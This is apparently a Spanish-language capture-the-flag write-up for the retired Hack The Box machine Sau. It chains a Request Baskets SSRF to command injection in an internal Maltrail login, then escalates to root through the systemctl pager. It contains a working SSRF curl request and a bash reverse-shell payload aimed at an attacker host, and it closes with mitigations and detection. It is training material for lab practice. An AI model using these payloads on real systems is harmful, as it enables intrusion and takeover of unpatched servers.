---
machine: Sau
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / SSRF
state: Retired
tags: [ssrf, request-baskets, maltrail, cve-2023-27163, systemctl, less]
---

# Sau — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Cadena de dos saltos: **Request Baskets 1.2.1** en el 55555 con **SSRF** (CVE-2023-27163) permite alcanzar un **Maltrail 0.53** que sólo escucha en `127.0.0.1:80`; su inyección de comandos en el campo `username` del login da shell como `puma` (aviso público de huntr y PoC de `spookier`; las fuentes lo citan como CVE-2023-27148 y como CVE-2023-31543, así que se nombra el fallo sin elegir identificador). La escalada es `sudo systemctl status` → **pager `less`** → `!sh`.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
55555/tcp open  http    Golang net/http (request-baskets 1.2.1)
```

El 80 está filtrado; el pie de la web dice `request-baskets | Version: 1.2.1`.

## Enumeración

- **22** SSH y **55555** son los únicos puertos alcanzables; **80** y **8338** aparecen *filtrados* (`nmap` los marca así, no cerrados).
- El pie de la página del 55555 publica la versión: `Powered by request-baskets | Version: 1.2.1`, la última afectada por CVE-2023-27163.
- La UI vive en `/web`; la API que crea *baskets* es `/api/baskets/<nombre>` y acepta `forward_url`, `proxy_response`, `expand_path` y `capacity`.
- El nombre del basket está restringido por regex (`^[\w\-_.]{1,250}$`), así que no sirve para inyectar: el vector es el `forward_url`.

## Foothold

1. **SSRF**: crear un *basket* con `forward_url` apuntando al `localhost` interno.

```bash
curl -X POST http://<IP>:55555/api/baskets/proxy \
  -H 'Content-Type: application/json' \
  -d '{"forward_url":"http://127.0.0.1:80","proxy_response":true}'
```

2. **Maltrail 0.53** se ve ahora a través de `http://<IP>:55555/proxy`. La inyección va en el usuario del formulario de login:

```bash
# /login con username: ;bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';
```

3. Shell como **`puma`**.

## Movimiento lateral

No hay salto lateral: la cadena SSRF → Maltrail ocurre dentro del mismo host y `puma` es ya el usuario final. Lo que sí hay es un **pivote de red**: el 80 filtrado se vuelve alcanzable a través del proxy del 55555.

## Escalada de privilegios

```bash
sudo -l
```

```text
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

`systemctl status` abre el pager heredando privilegios; desde `less`:

```text
!/bin/sh
```

Es el comportamiento descrito en CVE-2023-26604.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **`proxy_response`**: sin esa opción el basket reenvía pero no devuelve el cuerpo.
- **URL filtrada**: el `Host` público no llega al 80; hay que pasar por el proxy.
- **`systemctl` sin TTY**: con `sudo` y una terminal real el pager aparece; por SSH no interactivo, usar `-t`.

- SSRF convierte un servicio interno en externo: el cortafuegos deja de proteger.
- Un panel con inyección de comandos y credenciales por defecto es RCE inmediato.
- `sudo` sobre herramientas con pager o editor es ejecución de comandos como root.

## Mitigaciones y detección

- Actualizar `request-baskets` por encima de 1.2.1 y no exponer la UI de administración a Internet.
- Restringir el **egress** del propio servicio: un SSRF sólo llega a `127.0.0.1` si el proceso puede abrir esas conexiones.
- Parchar Maltrail (≥ 0.54) y no dejar paneles internos con credenciales por defecto.
- `systemctl status` como root equivale a un shell: usar `--no-pager` o `SYSTEMD_PAGER=cat` en la regla, o mejor, permitir sólo `systemctl is-active`.
- Detección: peticiones a `/api/baskets/*` con `forward_url` apuntando a loopback y procesos web lanzando bash.

## Referencias

- [CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)
- [CVE-2023-27148](https://nvd.nist.gov/vuln/detail/CVE-2023-27148)
- [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)
